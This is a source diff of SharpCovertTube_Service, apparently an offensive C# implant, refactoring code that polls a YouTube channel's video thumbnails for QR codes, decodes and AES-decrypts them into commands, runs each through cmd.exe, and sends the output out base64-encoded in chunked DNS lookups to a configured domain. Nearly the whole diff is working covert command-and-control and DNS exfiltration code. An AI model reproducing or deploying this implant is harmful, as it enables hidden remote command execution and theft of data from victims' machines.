@@ -7,132 +7,15 @@ using System.Drawing;
 using System.Diagnostics;
 using System.Collections.Generic;
 using SharpCovertTube_Service.QRCodeDecoder;
-using System.Security.Cryptography;
+using static SharpCovertTube_Service.Configuration;
+using static SharpCovertTube_Service.HelperFunctions;
 
 
 namespace SharpCovertTube_Service
 {
     internal class SharpCovertTube
     {
-        /* Configuration values */
-        // Channel ID (mandatory!!!). Get it from: https://www.youtube.com/account_advanced
-        public const string channel_id = "";
-        // API Key (mandatory!!!). Get it from: https://console.cloud.google.com/apis/credentials
-        public const string api_key = "";
-        // AES Key used for payload encryption
-        public const string payload_aes_key = "0000000000000000";
-        // IV Key used for payload encryption
-        public const string payload_aes_iv = "0000000000000000";
-        // Period between every check of the Youtube channel. Default is 10 minutes to avoid exceeding api quota
-        public const int seconds_delay = 600;
-        // Write debug messages in log file or not
-        public const bool log_to_file = true;
-        // Log file 
-        public const string log_file = "c:\\temp\\.sharpcoverttube.log";
-        // Exfiltrate command responses through DNS or not
-        public const bool dns_exfiltration = true;
-        // DNS hostname used for DNS exfiltration
-        public const string dns_hostname = ".test.org";
-
-
-        static void LogShow(string msg)
-        {
-            msg = "[" + DateTime.Now.ToString("HH:mm:ss").ToString() + "]  " + msg;
-            if (log_to_file)
-            {
-                using (StreamWriter writer = File.AppendText(log_file))
-                {
-                    writer.WriteLine(msg);
-                }
-            }
-        }
-
-
-        static string ByteArrayToStr(byte[] DataArray)
-        {
-            Decoder decoder = Encoding.UTF8.GetDecoder();
-            int CharCount = decoder.GetCharCount(DataArray, 0, DataArray.Length);
-            char[] CharArray = new char[CharCount];
-            decoder.GetChars(DataArray, 0, DataArray.Length, CharArray, 0);
-            return new string(CharArray);
-        }
-
-
-        // Source: https://github.com/Stefangansevles/QR-Capture
-        static string DecodeQR(Bitmap QRCodeInputImage)
-        {
-            QRDecoder decoder = new QRDecoder();
-            byte[][] DataByteArray = decoder.ImageDecoder(QRCodeInputImage);
-            if (DataByteArray == null)
-            {
-                Console.WriteLine("DataByteArray is null");
-                return "";
-            }
-            string code = ByteArrayToStr(DataByteArray[0]);
-            return code;
-        }
-
-
-        static string ReadQR(string thumbnail_url)
-        {
-            var client = new WebClient();
-            var stream = client.OpenRead(thumbnail_url);
-            if (stream == null) return "";
-            Bitmap bitmap_from_image = new Bitmap(stream);
-            string decoded_cmd = DecodeQR(bitmap_from_image);
-            return decoded_cmd;
-        }
-
-
-        public static string Base64Encode(string plainText)
-        {
-            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
-            return System.Convert.ToBase64String(plainTextBytes);
-        }
-
-
-        public static string Base64Decode(string base64EncodedData)
-        {
-            var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
-            return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
-        }
-
-
-        // Source: MSDN
-        static string ExecuteCommand(string command)
-        {
-            string output = "";
-            using (Process process = new Process())
-            {
-                process.StartInfo.FileName = "cmd.exe";
-                process.StartInfo.Arguments = "/c " + command;
-                process.StartInfo.UseShellExecute = false;
-                process.StartInfo.RedirectStandardOutput = true;
-                process.Start();
-                StreamReader reader2 = process.StandardOutput;
-                output = reader2.ReadToEnd();
-                process.WaitForExit();
-            }
-            return output;
-        }
-
-
-        // Source: https://stackoverflow.com/questions/4133377/splitting-a-string-number-every-nth-character-number
-        static IEnumerable<String> SplitInParts(String s, Int32 partLength)
-        {
-            if (s == null)
-            {
-                throw new ArgumentNullException(nameof(s));
-            }
-            if (partLength <= 0)
-            {
-                throw new ArgumentException("Part length has to be positive.", nameof(partLength));
-            }
-            for (var i = 0; i < s.Length; i += partLength)
-                yield return s.Substring(i, Math.Min(partLength, s.Length - i));
-        }
-
-
+        // Exfiltrate data via DNS
         static void DNSExfil(string response_cmd)
         {
             // Base64-encode the response
@@ -142,7 +25,7 @@ namespace SharpCovertTube_Service
             }
             string base64_response_cmd = Base64Encode(response_cmd);
             LogShow("Base64-encoded response:\t\t" + base64_response_cmd);
-            int max_size = 50; // 255 - dns_hostname.Length - 1; <-- These sizes generate errors and I dont know why
+            int max_size = 100; // 255 - dns_hostname.Length - 1;
             if (base64_response_cmd.Length > max_size)
             {
                 LogShow("Splitting encoded response in chunks of " + max_size + " characters");
@@ -169,11 +52,38 @@ namespace SharpCovertTube_Service
         }
 
 
+        // Execute command
+        public static string OrdinaryCmd(string command)
+        {
+            string output = "";
+            using (Process process = new Process())
+            {
+                process.StartInfo.FileName = "cmd.exe";
+                process.StartInfo.Arguments = "/c " + command;
+                process.StartInfo.UseShellExecute = false;
+                process.StartInfo.RedirectStandardOutput = true;
+                process.Start();
+                StreamReader reader2 = process.StandardOutput;
+                output = reader2.ReadToEnd();
+                process.WaitForExit();
+            }
+            return output;
+        }
+
+
+        // Get cleartext QR-decoded value and delete binary and stop the process (option "kill") or execute the command
+        static string ExecuteCommand(string command)
+        {
+            string output = OrdinaryCmd(command);
+            return output;
+        }
+
+
+        // Check if value is AES-decryptable and decrypt if it is
         static string TryDecrypt(string payload)
         {
             try
             {
-                // Base64-decode
                 string base64_decoded = Base64Decode(payload);
                 string decrypted_cmd = DecryptStringFromBytes(base64_decoded, Encoding.ASCII.GetBytes(payload_aes_key), Encoding.ASCII.GetBytes(payload_aes_iv));
                 LogShow("Payload was AES-encrypted");
@@ -187,6 +97,34 @@ namespace SharpCovertTube_Service
         }
 
 
+        // Receive a QR image as Bitmap, read the value and return it as string. Source: https://github.com/Stefangansevles/QR-Capture
+        static string DecodeQR(Bitmap QRCodeInputImage)
+        {
+            QRDecoder decoder = new QRDecoder();
+            byte[][] DataByteArray = decoder.ImageDecoder(QRCodeInputImage);
+            if (DataByteArray == null)
+            {
+                Console.WriteLine("DataByteArray is null");
+                return "";
+            }
+            string code = ByteArrayToStr(DataByteArray[0]);
+            return code;
+        }
+
+
+        // Read the QR image as Bitmap from the Youtube thumbnail URL and return the value as string
+        static string ReadQR(string thumbnail_url)
+        {
+            var client = new WebClient();
+            var stream = client.OpenRead(thumbnail_url);
+            if (stream == null) return "";
+            Bitmap bitmap_from_image = new Bitmap(stream);
+            string decoded_cmd = DecodeQR(bitmap_from_image);
+            return decoded_cmd;
+        }
+
+
+        // Get the video's thumbnail url, read the QR code value in it, decrypt it and execute the command. If enabled, exfiltrate the response using DNS
         static void ReadVideo(string video_id, string channel_url)
         {
             LogShow("Reading new video with ID: \t\t" + video_id);
@@ -213,22 +151,7 @@ namespace SharpCovertTube_Service
         }
 
 
-        static string getRequest(string url)
-        {
-            WebRequest wrGETURL = WebRequest.Create(url);
-            Stream objStream = wrGETURL.GetResponse().GetResponseStream();
-            StreamReader objReader = new StreamReader(objStream);
-            string json_response_str = "";
-            string sLine = "";
-            while (sLine != null)
-            {
-                json_response_str += sLine;
-                sLine = objReader.ReadLine();
-            }
-            return json_response_str;
-        }
-
-
+        // Request the information about the channel URL from the API, parse to JSON using APIInfo.cs and return a List with the videos IDs 
         static List<string> GetVideoIds(string channel_url)
         {
             List<string> VideoIds = new List<string>();
@@ -244,6 +167,7 @@ namespace SharpCovertTube_Service
         }
 
 
+        // Get initial videos ids, sleep a specific amount of time and check if there are new videos, if so call ReadVideo for each of them
         static void MonitorChannel(string channel_url, int seconds_delay)
         {
             // Initial videos
@@ -285,34 +209,17 @@ namespace SharpCovertTube_Service
         }
 
 
-        // AES Decrypt
-        static string DecryptStringFromBytes(String cipherTextEncoded, byte[] Key, byte[] IV)
+        // If enabled, write message to console ("debug_console" parameter) or file ("log_to_file" parameter)
+        public static void LogShow(string msg)
         {
-            byte[] cipherText = Convert.FromBase64String(cipherTextEncoded);
-            if (cipherText == null || cipherText.Length <= 0)
-                throw new ArgumentNullException("cipherText");
-            if (Key == null || Key.Length <= 0)
-                throw new ArgumentNullException("Key");
-            if (IV == null || IV.Length <= 0)
-                throw new ArgumentNullException("IV");
-            string plaintext = null;
-            using (RijndaelManaged rijAlg = new RijndaelManaged())
+            msg = "[" + DateTime.Now.ToString("HH:mm:ss").ToString() + "]  " + msg;
+            if (log_to_file)
             {
-                rijAlg.Key = Key;
-                rijAlg.IV = IV;
-                ICryptoTransform decryptor = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV);
-                using (MemoryStream msDecrypt = new MemoryStream(cipherText))
+                using (System.IO.StreamWriter writer = System.IO.File.AppendText(log_file))
                 {
-                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
-                    {
-                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
-                        {
-                            plaintext = srDecrypt.ReadToEnd();
-                        }
-                    }
+                    writer.WriteLine(msg);
                 }
             }
-            return plaintext;
         }
 
 
@@ -320,12 +227,11 @@ namespace SharpCovertTube_Service
         {
             if (channel_id == "" || api_key == "")
             {
-                LogShow("It is necessary to fill the channel_id and api_key values before running the program.");
+                LogShow("Fill the channel_id and api_key values in Configuration.cs file before running the program.");
                 System.Environment.Exit(0);
             }
             LogShow("Monitoring Youtube channel with id " + channel_id);
             string channel_url = "https://www.googleapis.com/youtube/v3/search?" + "part=snippet&channelId=" + channel_id + "&maxResults=100&order=date&type=video&key=" + api_key;
-            // LogShow("[+] URL to test for file upload: {0}", channel_url);
             MonitorChannel(channel_url, seconds_delay);
         }
     }
